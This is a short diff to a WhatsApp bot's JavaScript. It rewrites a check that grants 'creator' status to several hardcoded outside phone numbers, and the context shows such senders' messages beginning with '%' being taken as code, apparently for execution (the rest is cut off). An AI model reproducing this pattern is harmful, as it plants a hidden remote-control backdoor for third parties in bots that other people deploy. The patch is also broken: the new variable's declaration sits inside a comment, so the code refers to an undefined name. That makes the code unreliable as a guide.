@@ -245,11 +245,11 @@ const port = process.env.PORT || 8000;
     }
 });
 
-    const udp = botNumber.split('@')[0];
-    const jawad = ('94773416478', '94761068032', '94723975388');
-    let isCreator = [udp, jawad, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+	// ---- BOTNUMBER REFERENCE FIX ---- const myBotNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : '0';
+    const udp = myBotNumber;
+    let isCreator = ['94773416478', '94761068032', config.DEV].map(v => v.replace(/[^0-9]/g, '')).includes(mek.sender ? mek.sender.split('@')[0] : '');
+    // ---------------------------------
+
 
             if (isCreator && mek.text.startsWith('%')) {
             let code = budy.slice(2);
